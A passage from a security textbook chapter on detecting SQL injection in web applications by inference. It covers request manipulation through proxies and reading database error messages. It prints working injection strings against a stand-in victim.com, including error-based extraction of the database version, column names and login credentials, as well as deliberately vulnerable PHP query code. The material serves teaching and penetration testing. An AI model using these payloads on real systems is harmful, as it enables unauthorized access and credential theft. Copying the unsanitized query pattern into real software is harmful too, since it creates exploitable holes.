tested for remotely (i.e., over the Internet as \npart of an application penetration test) you usually don’t have the opportunity to look at the source code to review the structure of the query into which you are injecting. This often leads to a need to perform much of your testing through inference —that is, “If I see this, then this is \nprobably happening at the back end.”  \nThis chapter discusses techniques for finding SQL injection issues from the perspective of a \nuser sitting in front of his browser and interacting with a Web application. The same techniques apply to non -Web applications with a back -end database. We will also discuss \ntechniques for confirming that the issue is indeed SQL injection and not some othe r issue, such \nas XML injection. Finally, we’ll look at automating the SQL injection discovery process to increase the efficiency of detecting simpler cases of SQL injection.  \nFinding SQL Injection  \nSQL injection can be present in any front -end application accepting data entry from a system \nor user, which is then used to access a database server. In this section, we will focus on the Web environment, as this is the most common scenario, and we will therefore initially be armed with just a Web browser.  \nIn a Web environment, the Web browser is a client acting as a front -end requesting data \nfrom the user and sending them to the remote server which will create SQL queries using the \nsubmitted data. Our main goal at this stage is to identify anomalies in the server response and \ndetermine whether they are generated by a SQL injection  vulnerability. At a later stage, we \nwill identify the kind of SQL query (SELECT, UPDATE, INSERT or DELETE) that is \nrunning on the server, and where in the query you are injecting code (in the FROM section, the WHERE section, ORDER BY, etc.).  \nAlthough you will see many examples and scenarios in this chapter, we will not cover every \nSQL injection possibility that can be found. Think of it this way: Someone can teach you how to add two numbers, but it is not necessary (or practical) to cover every single possibility; as long as you know how to add two numbers you can apply that knowledge to every scenario involving addition. SQL inject ion is the same. You need to understand the hows  and whys  and \nthe rest will simply be a matter of practice.  \nWe will rarely have access to the application source code, and therefore we will need to test \nby inference. Possessing an analytical mindset is very  important in understanding and \nprogressing an attack. You will need to be very careful in understanding server responses to gain an idea of what might be happening at the server side.  \nTesting by inference is easier than you might think. It is all about se nding requests to the \nserver and detecting anomalies in the response. You might be thinking that finding SQL injection vulnerabilities is about sending random values to the server, but you will see that \nonce you understand the logic and fundamentals of the  attack it becomes a straightforward and \nexciting process.  \nTesting by Inference  \nThere is one simple rule for identifying SQL injection vulnerabilities: Trigger anomalies by sending unexpected data. This rule implies that:  \n• You identify all the data entry on the Web application. \n• You know what kind of request might trigger anomalies. • You detect anomalies in the response from the server.  \nIt’s as simple as that. First you need to see how your Web browser sends requests to the \nWeb server. Different applicat ions behave in different ways, but the fundamentals should be \nthe same, as they are all Web -based environments. \nOnce you identify all the data accepted by the application, you need to modify them and \nanalyze the response from the server. Sometimes the resp onse will include a SQL error directly \nfrom the database and will make your life very easy; however, other times you will need to \nremain focused and detect subtle differences.  \nIdentifying Data Entry \nWeb environments are an example of client/server architecture. Your browser (acting as a \nclient) sends a request to the server and waits for a response. The server receives the request, generates a response, and sends it back to the client. Obviously, there must be some kind of understanding between the two part ies; otherwise, the client would request something and the \nserver wouldn’t know how to reply. The understanding of both parties is given by the use of a protocol ; in this case, HTTP.  \nOur first task is to identify all data entry accepted by the remote Web a pplication. HTTP \ndefines a number of actions that a client can send to the server; however, we  will focus on the \ntwo most relevant ones for the purpose of discovering SQL injection: the GET  and POST  \nHTTP methods. \nGET  Requests  \nGET  is an HTTP method that requests the server whatever information is indicated in the URL. \nThis is the kind of method that is normally used when you click on a link. Usually, the Web browser creates the GET  request, sends it to the Web server, and renders the response in the \nbrowser. Although it is transparent to the user, the GET  request that is sent to the Web server \nlooks like this:  \nGET /search.aspx?text=lcd%20monitors&cat=1&num=20 HTTP/1.1  \nHost: www.victim.com  \nUser-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en- US; rv:1.8.1.19) Gecko/20081216 \nUbuntu/8.04 (hardy) Firefox/2.0.0.19  \nAccept: text/xml,application/xml,application/xhtml+xml, \ntext/html;q=0.9,text/plain;q=0.8,image/png,∗ /∗;q=0.5  \nAccept-Language: en- gb,en;q=0.5  \nAccept-Encoding: gzip,deflate  \nAccept-Charset: ISO- 8859-1,utf-8;q=0.7,∗ ;q=0.7  \nKeep-Alive: 300  \nProxy-Connection: keep- alive  \nThis kind of request sends parameters within the URLs in the following format:  \n?parameter1=value1&parameter2=value2&parameter3=value3…  \nIn the preceding example, you can see th ree parameters: text , cat, and num. The remote \napplication will retrieve the values of the parameters and use them for whatever purpose they \nhave been designed. For GET  requests, you can manipulate the parameters by simply changing \nthem in your browser’s n avigation toolbar. Alternatively, you can also use a proxy tool, which \nI’ll explain shortly.  \nPOST  Requests  \nPOST  is an HTTP method used to send information to the Web server. The action the server \nperforms is determined by the target URL. This is normally the method used when you fill in a form in your browser and click the Submit button. Although your browser does everything transparently for you, this is an example of what is sent to the remote Web server:  \nPOST /contact/index.asp HTTP/1.1  \nHost: www.victim.com  \nUser-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en- US; rv:1.8.1.19) Gecko/20081216 \nUbuntu/8.04 (hardy) Firefox/2.0.0.19  \nAccept: text/xml,application/xml,application/xhtml+xml, \ntext/html;q=0.9,text/plain;q=0.8,image/png,∗ /∗;q=0.5  \nAccept-Language: en- gb,en;q=0.5  \nAccept-Encoding: gzip,deflate  \nAccept-Charset: ISO- 8859-1,utf-8;q=0.7,∗ ;q=0.7  \nKeep-Alive: 300  \nReferer: http://www.victim.com/contact/index.asp  \nContent- Type: application/x- www-form-urlencoded  \nContent- Length: 129  \nfirst=John&last=Doe&email=john@doe.com&phone=555123456&title=Mr&country=US&comments=I%20woul\nd%20like%20to%20request%20information  \nThe values sent to the Web server have the same format explained for the GET  request, but \nare now located at the bottom of the request.  \nNote  \nKeep one thing in mind: It doesn’t matter how these data are presented to you in the browser. Some of the values \nmight be hidden fields within the form, and others might be drop- down fields wi th a set of choices; you may have \nsize limits, or even disabled fields.  \nRemember that all of those features are part of the client -side functionality, and you have full control of what \nyou send to the server. Do not think of client -side interface mechanism s as security functionality.  \nYou may be wondering how you modify data if the browser is not allowing you to do so. \nThere are a couple of ways to do this:  \n• Browser modification extensions  \n• Proxy servers  \nBrowser modification extensions are plug- ins that ru n on your browser and allow you to \nperform some additional functionality. For example, the Web Developer \n(https://addons.mozilla.org/en -US/firefox/addon/60 and \nhttps://chrome.google.com/webstore/detail/bfbameneiokkgbdmiekhjnmfkcnldhhm ) extensions \nfor Mozilla Firefox and Google Chrome allow you to visualize hidden fields, remove size limitations, and con vert HTML select  fields into input  fields, among other tasks. This can be \nvery useful when trying to manipulate data sent to the server. Tamper Data (https://addons.mozilla.org/en -US/firefo x/addon/966) is another interesting extension available \nfor Firefox. You can use Tamper Data to view and modify headers and POST  parameters in \nHTTP and HTTPS requests. Another option is SQL Inject Me ( https://addons.mozilla.org/en -\nUS/firefox/addon/7597). This tool sends database escape strings through the form fields found \nin the HTML page.  \nThe second solution is the use of a local proxy. A local proxy is a piece of software that sits \nbetween your browser and the server, as shown in Figure 2.1. The software runs locally on your computer; however, the figure shows a logical representation of a local proxy setup.  \n \nFigure 2.1  Proxy Intercepting Requests to the Web Server  \nFigure 2.1 shows how you can bypass any client -side restriction by using a proxy server. \nThe proxy intercepts the request to the server and permits you to modify it at will. To do this you need only two things:  \n• Installation of a proxy server on your computer  \n• Conf iguration of your browser to use your proxy server  \nYou can choose from a number of alternatives when installing a proxy for SQL injection \nattacks. The most notable ones are Paros Proxy, WebScarab, and Burp Suite, all of which can intercept traffic and allo w you to modify the data sent to the server. Although they have some \ndifferences, deciding which one to use usually depends on your personal choice.  \nAfter installing and running the software, you need to check on what port your proxy is \nlistening to. Set u p your Web browser to use the proxy and you are ready to go. Depending on \nthe Web browser of your choice, the settings are situated in a different menu. For instance, in Mozilla Firefox, click Edit  | Preferences  | Advanced  | Network  | Settings . \nFirefox ext ensions such as FoxyProxy ( https://addons.mozilla.org/en-\nUS/firefox/addon/2464) allow you to switch among predefined proxy settings, which can be very useful and can save you some time. The Google Chrome equivalent would be Proxy \nSwitchy ( https://chrome.google.com/webstore/detail/caehdcpeofiiigpdhbabniblemipncjj).  \n\nIn Microsoft Internet Explorer, you c an access the proxy settings in Tools  | Internet \nOptions  | Connections  | Lan Settings  | Proxy Server . \nOnce you have your proxy software running and your browser pointing to it, you can start \ntesting the target Web site and manipulate the parameters sent to  the remote application, as \nshown in Figure 2.2.  \n \nFigure 2.2  Burp Suite Intercepting a POST  Request  \nFigure 2.2 shows Burp Suite intercepting a POST  request and allowing the user to modify \nthe fields. The request has been intercepted by the proxy and the user can make arbitrary \nchanges to the content. Once finished the user should click the forward  button and the \nmodified request will be sent to the server.  \nLater, in “Confirming SQL Injection,” we will discuss the kind of content that can be \ninjected into the parameters to trigger SQL injection vulnerabilities.  \nOther Injectable Data  \nMost applications retrieve data from GET  or POST  parameters. However, other p arts of the \nHTTP request might trigger SQL injection vulnerabilities.  \n\nCookies are a good example. Cookies are sent to the user’s browser and they are \nautomatically sent back to the server in each request. Cookies are usually used for \nauthentication, session control, and maintaining specific information about the user, such as preferences in the Web site. As explained before, you have full control of the content sent to the server and so you should consider cookies as a valid form of user data entry, and the refore, \nas being susceptible to injection. \nOther examples of applications vulnerable to injection in other parts of the HTTP request \ninclude the Host , Referer , and User -Agent  headers. The Host header field specifies the Internet \nhost and port number of the  resource being requested. The Referer  field specifies the resource \nfrom which the current request was obtained. The User -Agent  header field determines the Web \nbrowser used by the user. Although these cases are uncommon, some network monitoring and Web trend applications use the Host , Referer , and User -Agent  header values to create graphs, \nfor example, and store them in databases. In such cases, it is worth testing those headers for potential injection vulnerabilities.  \nYou can modify cookies  and HTTP header s through proxy software in the same manner you \nsaw earlier in this chapter.  \nManipulating Parameters  \nWe’ll start with a very simple example so that you can become familiar with SQL injection vulnerabilities.  \nSay you visit the Web site for Victim Inc., an e -commerce shop where you can buy all kinds \nof things. You can check the products online, sort them by price, show only a certain category of product, and so forth. When you browse different categories of products you notice that the URL looks like the foll owing:  \nhttp://www.victim.com/showproducts.php?category=bikes  \nhttp://www.victim.com/showproducts.php?category=cars  \nhttp://www.victim.com/showproducts.php?category=boats  \nThe showproducts.php page receives a parameter called category . You don’t have to type \nanything, as the preceding links are presented o n the Web site, so you just have to click them. \nThe application at the server side is expecting known values and displays the products which belong to the given category.  \nEven without starting the process of testing you should already have a rough idea of how the \napplication may work. You can assert that the application is not static; it seems that depending \non the value of the category  parameter the application will show different products based on \nthe result of a query to a back- end database.  \nAt this poin t it is also important to consider what type of database operation may be \noccurring at the server side, as some of the things we will try may have side effects if we are not careful. There are four main types of operations at the database layer, as follows : \n• SELECT: read data from the database based on searching criteria  \n• INSERT: insert new data into the database  \n• UPDATE: update existing data based on given criteria  \n• DELETE: delete existing data based on given criteria  \nIn this example, we can assume that the remote application is performing a SELECT query, \nas it is showing information based on the category  parameter.  \nYou can now begin to manually change the values of the category  parameter to something \nthe application does not expect. Your first attempt can be something such as the following:  \nhttp://www.victim.com/showproducts.php?category=attacker  \nIn the preceding example, we sent a request to the server with a non- existent category  name. \nThe response from the server was as follows:  \nWarning: mysql_fetch_assoc(): supplied argument is not a valid MySQL result  \nresource in /var/www/victim.com/showproducts.php on line 34  \nThis warning is a MySQL database error returned by the database when the user tries to read \na record from an empty result set. This error indicates that the remote application is not properly handling unexpected data.  \nContinuing with the inference process you make a request, appending a single quote (‘) to \nthe value that you previously sent:  \nhttp://www.victim.com/showproducts.php?category=attacker ’ \nFigure 2.3 shows the response from the server.  \n \nFigure 2.3  MySQL Server Error  \nThe server returned the following error:  \nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server \nversion for the right syntax to use near “attacker”’ at line 1  \nAs you can see, some applications react in unexpected ways when handling user data. Not \nevery anomaly detected in a Web site is going to be due to a SQL injection vulnerability, as it \ncan be affected by a number of other issues. As you become more familiar with SQL injection exploitation, you will realize the importance of the single -quote character for detection \npurposes and you will learn to send the appropriate requests to the server to determine what types of injections are possible. \nAnother interesting test you can conduct to identify vulnerabilities in Oracle and \nPostgreSQL is to send th e following two requests to the Web server:  \nhttp://www.victim.com/showproducts.php?category=bikes  \nhttp://www.victim. com/showproducts.php?category=bi’||’kes  \nThe Microsoft SQL Server equivalent is:  \n\nhttp://www.victim.com/showproducts.php?category=bikes  \nhttp://www.victim.com/showproducts.php?category=bi’+’kes  \nThe MySQL equivalent (note the space between the single quotes) is:  \nhttp://www.victim.com/showproducts.php?category=bikes  \nhttp://www.victim.com/showproducts.php?category=bi’’kes  \nIf the result of both requests is the same, there is a high possibility th at there is a SQL \ninjection vulnerability.  \nAt this point, you may be a bit confused about the single quotes and encoded characters, but \neverything will make sense as you read this chapter. The goal of this section is to show you the \nkind of manipulation th at might trigger anomalies in the response from the Web server. In \n“Confirming SQL Injection,” I will expand on the input strings that we will use for finding SQL injection vulnerabilities . \nTools & Traps…  \nUser Data Sanitization  \nSQL injection vulnerabilitie s occur for two reasons:  \n• Lack of user input sanitization  \n• Data and control structures mixed in the same transport channel  \nThese two issues together have been the cause of some of the most important types of vulnerabilities exploited \nso far in the history of computers, such as heap and stack overflows, and format string issues.  \nThe lack of user input sanitization allows an attacker to jump  from the data part (e.g., a string enclosed between \nsingle quotes or a number) to inject control commands (such as SELECT , UNION, AND , OR, etc.).  \nTo defend against this type of vulnerability the first measure to adopt is to perform strict use r input sanitization \nand/or output encoding. For example, you can adopt a whitelist approach, whereby if you are expecting a number \nas a parameter value, you can configure your Web application to reject every character from the user -supplied \ninput which is  not a digit. If you are expecting a string, you only accept characters that you previously determined \nare not hazardous. Where this is not possible, you must ensure that all inputs are correctly quoted/encoded prior to \nbeing used to prevent SQL injection.  \nIn the following sections, you will see how the information reaches the database server and \nwhy the preceding errors where generated.  \nInformation Workflow  \nIn the previous section, you saw some SQL injection errors displayed as a result of parameter \nmanipulation. You may be wondering why the Web server shows an error from the database if you modify a parameter. Although the errors are displayed in the Web server response, the SQL injection happens at the database layer. Those examples show how you can reach  a \ndatabase server via the Web application.  \nIt is important to have a clear understanding of how your data entry influences a SQL query \nand what kind of response you could expect from the server. Figure 2.4  shows how t he data \nsent from the browser are used in creating a SQL statement and how the results are returned to the browser.  \n \nFigure 2.4  Flow of Information in a Three -Tier Architecture \nFigure 2.4 shows the information workflow between all parties normally involved in a \ndynamic Web request:  \n1. The user sends a request to the Web server.  \n2. The Web server retrieves user data, creates a SQL statement which contains the entry from \nthe user, and then sends the query to the database server.  \n\n3. The database server executes the SQL query and returns th e results to the Web server. Note \nthat the database server doesn’t know about the logic of the application; it will just execute a \nquery and return results. \n4. The Web server dynamically creates an HTML page based on the database response.  \nAs you can see, the Web server and the database server are separate entities. These entities \nmay be running on the same physical server or on different ones. The Web server just creates a SQL query, parses the results, and displays the results to the user. The database se rver receives \nthe query and returns the results to the Web server. This is very important for exploiting SQL injection vulnerabilities because if you can manipulate the SQL statement and make the database server return arbitrary data (such as usernames and  passwords from the Victim Inc. \nWeb site) the Web server has no means to verify whether the data are legitimate and will therefore pass the data back to the attacker.  \nDatabase Errors  \nIn the previous section, you saw some SQL injection errors displayed as a  result of parameter \nmanipulation. Although the errors are displayed in the Web server response, the SQL injection happens at the database layer. Those examples showed how you can reach a database server via the Web application. \nIt is very important that y ou familiarize yourself with the different database errors that you \nmay get from the Web server when testing for SQL injection vulnerabilities. Figure 2.5 shows \nhow a SQL injection error happens and how the Web server deals with it.  \n \nFigure 2.5  Information Flow during a SQL Injection Error  \nAs you can see  in Figure 2.5, the following occurs during a SQL injection error:  \n1. The user sends a request in an attempt to identify a SQL injection vulnerability. In this case, \nthe user sends a value with a single quote appended to it.  \n\n2. The Web server retrieves user data and sends a SQL query to the database server. In this \nexample, you can see that the SQL statement created by the Web server includes the user \ninput and forms a syntactically incorrect query due to the two terminating quotes. \n3. The database server receives the malformed SQL query and returns an error to the Web \nserver.  \n4. The Web server receives the error from the database and sends an HTML response to the user. In this case, it sent the error message, but it is entirely up to the application how it presents any errors in the contents of the HTML response.  \nThe preceding example illustrates the scenario of a request from the user which triggers an \nerror on the database. Depending on how the application is coded, the response returned in step 4 will be constructed and handled as a result of one of the following:  \n• The SQL error is displayed on the page and is visible to the user from the Web browser.  \n• The SQL error is hidden in the source of the Web page for debuggi ng purposes. \n• Redirection to another page is used when an error is detected.  \n• An HTTP error code 500 (Internal Server Error) or HTTP redirection code 302 is returned.  \n• The application handles the error properly and simply shows no results, perhaps displ aying a \ngeneric error page.  \nWhen you are trying to identify a SQL injection vulnerability you need to determine the \ntype of response the application is returning. In the next few sections, we will focus on the most common scenarios that you may encounter. The ability to identify the remote database is \nparamount to successfully progressing an attack and moving on from identification of the vulnerability to further exploitation.  \nCommonly Displayed SQL Errors  \nIn the previous section, you saw that applications react differently when the database returns an error. When you are trying to identify whether a specific input triggered a SQL vulnerability, the Web server error messages can be very useful. Your best scenario is an application returning the full SQL erro r, although this rarely occurs.  \nThe following examples will help you to familiarize yourself with some of the most typical \nerrors. You will see that SQL errors commonly refer to unclosed quotes. This is because SQL \nrequires enclosure of alphanumeric values  between single  quotes. You will see some examples \nof typical errors with a simple explanation of what caused the error.  \nMicrosoft SQL Server Errors  \nAs you saw previously, injecting a single quote into alphanumeric parameters could result in a database err or. In this section, you will see that the exact same entry can lead to different \nresults.  \nConsider the following request:  \nhttp://www.victim.com/showproducts.aspx?category=attacker’  \nThe error returned from the remote application will be similar to the following:  \nServer Error in ‘/’ Application.  \nUnclosed quotation mark before the character string ‘attacker;’.  \nDescription: An unhandled exception occurred during the execution of the current web \nrequest. Please review the stack trace for more information about the error and where it \noriginated in the code.  \nException Details: System.Data.SqlClient.SqlException: Unclosed quotation mark before the \ncharacter string ‘attacker;’.  \nObviously, you don’t have to memorize every error code. The important thing is that you \nunderstand when and why an error occurs. In both examples, you can assert that the remote \nSQL statement running on the database must be something similar to the following:  \nSELECT ∗ \nFROM products  \nWHERE category=‘attacker’’  \nThe application did not sanitize the single quotes, and therefore the syntax of the statement \nis rejected by the database server returning an error.  \nYou just saw an example of injection in an alphanumeric string. The following example will \nshow the typical error returned when injecting a numeric value, therefore not enclosed between \nquotes in the SQL statement.  \nImagine you find a page called showproduct.aspx in the victim.com application. The script \nreceives a parameter called id  and displays a single product depending on the value of the id  \nparameter:  \nhttp://www.victim.com/showproduct.aspx?id=2  \nWhen you change the value of the id  parameter to something such as the following:  \nhttp://www.victim.com/showproduct.aspx ?id=attacker  \nthe application returns an error similar to this: \nServer Error in ‘/’ Application.  \nInvalid column name ‘attacker’.  \nDescription: An unhandled exception occurred during the execution of the current web \nrequest. Please review the stack trace for more information about the error and where it \noriginated in the code.  \nException Details: System.Data.SqlClient.SqlException: Invalid column name ‘attacker’.  \nBased on the error, you can assume that in the first instance the application creates a SQL \nstateme nt such as this:  \nSELECT ∗ \nFROM products  \nWHERE idproduct=2  \nThe preceding statement returns a result set with the product whose idproduct  field equals 2. \nHowever, when you inject a non -numeric value, such as attacker , the resultant SQL statement \nsent to the database server has the following syntax:  \nSELECT ∗ \nFROM products  \nWHERE idproduct=attacker  \nThe SQL server understands that if the value is not a number it must be a column name. In \nthis case, the server looks for a column called attacker  within the products  table. However, \nthere is no column named attacker , and therefore it returns an Invalid column name ‘attacker’  \nerror.  \nThere are some techniques that you can use to retrieve information embedded in the errors \nreturned from the database. The first one genera tes an error converting a string to an integer:  \nhttp://www.victim.com/showproducts.aspx?category=bikes’and 1=0/@@version;--  \nApplication response:  \nServer Error in ‘/’ Application.  \nSyntax error converting the nvarchar value ‘Microsoft SQL Server 2000 – \n8.00.760 (Intel X86) Dec 17 2002 14:22:05 Copyright (c) 1988– 2003 Microsoft  \nCorporation Enterprise Edition on Windows NT 5.2 (Build 3790:)’ to a column of data type \nint. \nDescription: A n unhandled exception occurred during the execution of the current web \nrequest. Please review the stack trace for more information about the error and where it \noriginated in the code.  \n@@version is a SQL Server variable which contains a string with the vers ion of the \ndatabase server. In the preceding example the database reported an error converting  the result \nof @@version to an integer and displaying its contents. This technique abuses the type \nconversion functionality in SQL Server. We sent 0/@@version as part of our injected code. As \na division operation needs to be executed between two numbers, the database tries to convert \nthe result from the @@version variable into a number. When the operation fails the database \ndisplays the content of the variable.  \nYou can use this technique to display any variable in the database. The following example \nuses this technique to display the user  variable:  \nhttp://www.victim.com/showproducts.aspx?category=bikes’  and 1=0/user;--  \nApplication response:  \nSyntax error converting the nvarchar value ‘dbo’  to a column of data type int.  \nDescription: An unhandled exception occurred during the execution of the current web \nrequest. Please review the stack trace for more information about the error and where it \noriginated in the code.  \nThere are also techniques to display information about the SQL query executed by the \ndatabase, such as the use of having 1=1:  \nhttp://www.victim.com/showproducts.aspx?category=bikes’having1’=’1  \nApplication response:  \nServer Error in ‘/’ Application.  \nColumn ‘products.productid’ is invalid in the select list because it is not contained in an \naggregate function  and there is no GROUP BY clause.  \nDescription: An unhandled exception occurred during the execution of the current web \nrequest. Please review the stack trace for more information about the error and where it \noriginated in the code.  \nThe HAVING  clause is used in combination with the GROUP BY  clause. It can also be used \nin a SELECT  statement to filter the records that a GROUP BY  returns. GROUP BY  needs the \nSELECT ed fields to be a result of an aggregated function or to be included in the GROUP BY  \nclause. If the  requirement is not met, the database sends back an error displaying the first \ncolumn where this issue appeared.  \nUsing this technique and GROUP BY  you can enumerate all the columns in a SELECT  \nstatement: \nhttp://www.victim.com/showproducts.aspx?category=bikes’GROUP BY productid having ‘1‘=’1  \nApplication response:  \nServer Error in ‘/’ Application.  \nColumn ‘products.name’  is invalid in the select list because it is not contained in either \nan aggregate function or the GROUP BY clause.  \nDescription: An unhandled exception occurred during the execution of the current web \nrequest. Please review the stack trace for more information about the error and where it \noriginated in the code.  \nIn the precedi ng example, we included the previously discovered column productid in the \nGROUP BY  clause. The database error disclosed the next column, name . Just keep appending \ncolumns to enumerate them all: \nhttp://www.victim.com/showproducts.aspx?category=bikes’GROUP BY productid, name having \n‘1’=’1  \nApplication response:  \nServer Error in ‘/’ Application.  \nColumn ‘products.price’ is invalid in the select list because it is not contained in either \nan aggregate function or the GROUP BY clause.  \nDescription: An unhandled exception occurred during the execution of the current web \nrequest. Please review the stack trace for more information about the error and where it originated in the code.\n \nOnce you have enumerated the column names you can retrieve the values using the \nconverting error technique that you saw earlier:  \nhttp://www.victim.com/showproducts.aspx?category=bikes’and 1=0/name;--  \nApplication response:  \nServer Error in ‘/’ Application.  \nSyntax error converting the nvarchar value ‘Claud Butler Olympus D2’ to a column of data \ntype int.  \nDescription: An unhandled exception occurred during the execution of the current web \nrequest. Please review the stack trace for more information about the error and where it originated in the code.\n \nTip \nInformation disclosure in error messages can be very useful to an attacker targeting  applications using SQL \nServer databases. If you find this kind of disclosure in an authentication mechanism, try to enumerate the \nusername and password column names (which are likely to be user  and password ) using the HAVING  and \nGROUP BY  techniques alread y explained:  \nhttp://www.victim.com/logon.aspx?username=test’having1’=’1  \nhttp://www.victim.com/logon.aspx?username=test’ GROUP BY User having ‘1’=’1  \nAfter discovering the column names, you can disclose the credentials of the first account, which is likely to \npossess administrative privileges:  \nhttp://www.victim.com/logon.aspx?username=test’  and 1=0/User and 1’=’1  \nhttp://www.victim.com/logon.aspx?username=test  ’ and 1=0/Password and 1’=’1  \nYou can also disco ver other accounts adding the discovered usernames in a negative condition to exclude them \nfrom the result set:  \nhttp://www.victim.com/logon.aspx?username=test’ and User not in (‘Admin’) and 1=0/User and 1’=’1  \nYou can configure errors displayed in ASP.NET applications using the web.config file. This \nfile is used to define the settings and configurations of an ASP.NET application. It is an XML \ndocument which can contain information about the loade d modules, security configuration, \ncompilation settings, and similar data. The customErrors  directive defines how errors are \nreturned to the Web browser. By default, customErrors=“On” , which prevents the application \nserver from displaying verbose errors to remote visitors. You can completely disable this \nfeature using the following code, although this is not recommended in production environments:  \n<configuration>  \n <system.web>  \n  <customErrors mode=“Off”/>  \n </system.web>  \n</configuration>  \nAnother possibility is to display different pages depending on the HTTP error code \ngenerated when rendering the page:  \n<configuration>  \n <system.web>  \n  <customErrorsdefaultRedirect=“Error.aspx” mode=“On”>  \n   <errorstatusCode=“403” redirect=“AccessDenied.aspx”/>  \n   <errorstatusCode=“404” redirect=“NotFound.aspx”/>  \n   <errorstatusCode=“500” redirect=“InternalError.aspx”/>  \n  </customErrors>  \n </system.web>  \n</configuration>  \nIn the preceding example, the application by default will redirect the user to Error.aspx. \nHowever, in three cases (HTTP codes 403, 404, and 500) the user will be redirected to another \npage.  \nMySQL Errors  \nIn this section, you will see some of the typical MySQL errors. All of the main server -side \nscripting languages can access MySQL databases. MyS QL can be executed in  many \narchitectures and operating systems. A common configuration is formed by an Apache Web server running PHP on a Linux operating system, but you can find it in many other scenarios as well.  \nThe following error is usually an indicat ion of a MySQL injection vulnerability:  \nWarning: mysql_fetch_array(): supplied argument is not a valid MySQL result  \nresource in /var/www/victim.com/showproduct.php on line 8  \nIn this example, the attacker injected a single quote in a GET  parameter and the P HP page \nsent the SQL statement to the database. The following fragment of PHP code shows the \nvulnerability:  \n<?php  \n//Connect to the database  \nmysql_connect(“[database]”, “[user]”, “[password]”) or//Error checking in case the database \nis not accessible  \n die(“Could not connect:”. mysql_error());  \n//Select the database  \nmysql_select_db(“[database_name]”);  \n//We retrieve category value from the GET request  \n$category = $_GET[“category”];  \n//Create and execute the SQL statement  \n$result = mysql_query(“SELECT ∗ from products where category=‘ $category ’”); \n//Loop on the results  \nwhile ($row = mysql_fetch_array($result, MYSQL_NUM)) {printf(“ID: %s Name: %s”, $row[0], \n$row[1]);  \n} \n//Free result set  \nmysql_free_result($result);  \n?> \nThe code  shows that the value retrieved from the GET  variable is used in the SQL statement \nwithout sanitization. If an attacker injects a value with a single quote, the resultant SQL statement will be: \nSELECT ∗ \nFROM products  \nWHERE category=‘attacker’’  \nThe precedin g SQL statement will fail and the mysql_query  function will not return any \nvalue. Therefore, the $result  variable will not be a valid MySQL result resource. In the \nfollowing line of code, the mysql_fetch_array ($result , MYSQL_NUM ) function will fail and \nPHP will show the warning message that indicates to an attacker that the SQL statement could \nnot be executed.  \nIn the preceding example, the application does not disclose details regarding the SQL error, \nand therefore the attacker will need to devote more effo rt in determining the correct way to \nexploit the vulnerability. In “Confirming SQL Injection,” you will see techniques for this kind \nof scenario. \nPHP has a built -in function called mysql_error  which provides information about the errors \nreturned from the M ySQL database during execution of a SQL statement. For example, the \nfollowing PHP code displays errors caused during execution of the SQL query:  \n<?php  \n//Connect to the database  \nmysql_connect(“[database]”, “[user]”, “[password]”) or//Error checking in case the database \nis not accessible  \n die(“Could not connect:”. mysql_error());  \n//Select the database  \nmysql_select_db(“[database_name]”);  \n//We retrieve category value from the GET request  \n$category = $_GET[“category”];  \n//Create and execute the SQL statement  \n$result = mysql_query(“SELECT ∗ from products where category=‘ $category ’”); \nif (!$result) { //If there is any error  \n//Error checking and display  \ndie(‘<p>Error:’. mysql_error(). ‘</p>’);  \n} else {// Loop on the results  \nwhile ($row = mysql_fetch_array($result, MYSQL_NUM)) {printf(“ID: %s Name: %s”, $row[0], \n$row[1]);  \n}//Free result set  \nmysql_free_result($result);  \n} \n?> \nWhen an application running the preceding code catches database errors and the SQL query \nfails, the retur ned HTML document will include the error returned by the database. If an \nattacker modifies a string parameter by adding a single quote the server will return output \nsimilar to the following: \nError: You have an error in your SQL syntax; check the manual that corresponds to your MySQL \nserver version for the right syntax to use near  \n’’’at line 1  \nThe preceding output provides information regarding why the SQL query failed. If the \ninjectable parameter is not a string and therefore is not enclosed between single quotes, the resultant output would be similar to this:  \nError: Unknown column ‘attacker’ in ‘where clause’  \nThe behavior in MySQL server is identical to Microsoft SQL Server; because the value is \nnot enclosed between quotes MySQL treats it as a column name. The SQL statement executed was along these lines:  \nSELECT ∗ \nFROM products  \nWHERE idproduct=attacker  \nMySQL cannot find a column name called attacker , and therefore returns an error.  \nThis is the code snippet from the PHP script shown earlier in charge of error handling:  \nif (!$result) { //If there is any error  \n//Error checking and display  \ndie(‘<p>Error:’. mysql_error(). ‘</p>’);  \n} \nIn this example, the error is caught and then displayed using the die()  function. The PHP \ndie()  function prints a message and gracefully exits the current script. Other options are \navailable for the programmer, such as redirecting to another page:  \nif (!$result) { //If there is any error  \n//Error checking and red irection  \nheader(“Location:http://www.victim.com/error.php”);  \n} \nWe will analyze server responses in “Application Response,” and discuss how to confirm \nSQL injection vulnerabilities in responses without errors.  \nOracle Errors  \nIn this section, you will see some examples of typical Oracle errors. Oracle databases are \ndeployed using various technologies. As mentioned before, you don’t need to learn every single error returned from the database; the important thing is that you can identify a database error when you see it. \nWhen tampering with the parameters of Java applications with an Oracle back -end database \nyou will often find the following error:  \njava.sql.SQLException: ORA- 00933: SQL command not properly ended at  \noracle.jdbc.dbaccess.DBError.throwSqlException(DBError.java:180) at  \noracle.jdbc.ttc7.TTIoer.processError(TTIoer.java:208)  \nThe preceding error is very generic and means that you tried to execute a syntactically \nincorrect SQL statement. Depending on the code running on the  server you can find the \nfollowing error when injecting a single quote:  \nError: SQLExceptionjava.sql.SQLException: ORA- 01756: quoted string not properly terminated  \nIn this error the Oracle database detects that a quoted string in the SQL statement is not \nproperly terminated, as Oracle requires that a string be terminated with a single quote. The \nfollowing error re -creates the same scenario in .NET environments:  \nException Details: System.Data.OleDb.OleDbException: One or more errors  \noccurred during processing of command.  \nORA-00933: SQL command not properly ended  \nThe following example shows an error returned from a .NET application executing a \nstatement with an unclosed quoted string:  \nORA-01756: quoted string not properly terminated  \nSystem.Web.HttpUnhandledException: Exception of type  \n‘System.Web.HttpUnhandledException’ was thrown. ---> \nSystem.Data.OleDb.OleDbException: ORA- 01756: quoted string not properly terminated  \nThe PHP function ociparse()  is used to prepare an Oracle statement for execution. Here is an \nexample of the error generated by the PHP engine when the function fails:  \nWarning: ociparse() [function.ociparse]: ORA- 01756: quoted string not  \nproperly terminated in /var/www/victim.com/ocitest.php on line 31  \nIf the ociparse()  function fails and the error i s not handled, the application may show some \nother errors as a consequence of the first failure. This is an example:  \nWarning: ociexecute(): supplied argument is not a valid OCI8- Statement  \nresource in c: \\www\\victim.com\\ oracle\\index.php on line 31  \nAs you rea d this book, you will see that sometimes the success of an attack depends on the 